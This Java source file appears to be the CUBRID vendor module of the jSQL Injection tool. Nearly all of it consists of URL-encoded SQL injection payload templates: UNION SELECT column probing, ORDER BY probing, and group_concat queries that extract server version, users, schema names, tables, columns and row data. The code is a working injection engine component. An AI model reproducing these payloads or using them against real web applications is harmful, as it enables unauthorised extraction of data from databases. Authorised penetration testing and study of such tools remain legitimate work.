package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.accessible.bean.Database;
import com.jsql.model.accessible.bean.Table;
import com.jsql.model.strategy.Strategy;
import com.jsql.util.StringUtil;

public class CubridVendor extends AbstractVendor {

    @Override
    public String getSqlInfos() {
        return
            "concat(" +
                "" +
                    "concat_ws(" +
                        "'{%}'," +
                        "version()," +
                        "database()," +
                        "user()," +
                        "CURRENT_USER" +
                    ")" +
                "" +
                "," +
                "'%01%03%03%07'" +
            ")";
    }

    @Override
    public String getSqlDatabases() {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "r||" +
                        "'%05'||" +
                        "cast(q+as+varchar)||" +
                        "'%04'" +
                        "+order+by+1+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "cast(owner_name+as+varchar)r," +
                    "count(class_name)q+" +
                "from+" +
                    "db_class+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getSqlTables(Database database) {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "cast(r+as+varchar)||" +
                        "'%050%04'+" +
                        "order+by+1+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "class_name+r+" +
                "from+" +
                    "db_class+" +
                "where+" +
                    "owner_name='" + database + "'+" +
                "order+by+r{limit}" +
            ")x";
    }

    @Override
    public String getSqlColumns(Table table) {
        return
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "cast(n+as+varchar)||" +
                        "'%05'||" +
                        "0||" +
                        "'%04'+" +
                        "order+by+1+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "attr_name+n+" +
                "from+" +
                    "db_attribute+c+inner+join+db_class+t+on+t.class_name=c.class_name+" +
                "where+" +
                    "t.owner_name='" + table.getParent() + "'+" +
                    "and+" +
                    "t.class_name='" + table + "'+" +
                "order+by+n{limit}" +
            ")x";
    }

    @Override
    public String getSqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, "{%}");
        
        // character 7f, last available hexa character (starting at character 80, it gives ?)
        formatListColumn = formatListColumn.replace("{%}", "`,'')),'%7f',trim(ifnull(`");
        
        formatListColumn = "trim(ifnull(`" + formatListColumn + "`,''))";
        
        return
            "select+concat(" +
                "group_concat(" +
                    "'%04'||" +
                    "r||" +
                    "'%05'||" +
                    "cast(q+as+varchar)||" +
                    "'%04'" +
                    "+order+by+1+separator+'%06'" +
                ")," +
                "'%01%03%03%07'" +
            ")from(" +
                "select+" +
                    "cast(concat(" + formatListColumn + ")as+varchar)r," +
                    "count(*)q+" +
                "from+" +
                    "`" + database + "`.`" + table + "`+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getSqlNormal(String sqlQuery, String startPosition) {
        return
        "(" +
            "select+" +
                /**
                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
                 */
                "concat(" +
                    "'SQLi'," +
                    "substr(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        /**
                         * Minus 'SQLi' should apply
                         */
                        Strategy.NORMAL.getValue().getPerformanceLength() +
                    ")" +
                ")" +
        ")";
    }

    @Override
    public String getSqlIndicesCapacityCheck(String[] indexes) {
        return
            MediatorModel.model().sqlIndexes.replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                "(select+concat('SQLi',$1,repeat('%23',65536),'%01%03%03%07iLQS'))"
            );
    }

    @Override
    public String getSqlIndices(Integer nbFields) {
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("''||1337"+ i +"7330%2b1");
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String getSqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getSqlLimit(Integer limitSQLResult) {
        return "+limit+" + limitSQLResult + ",65536";
    }
}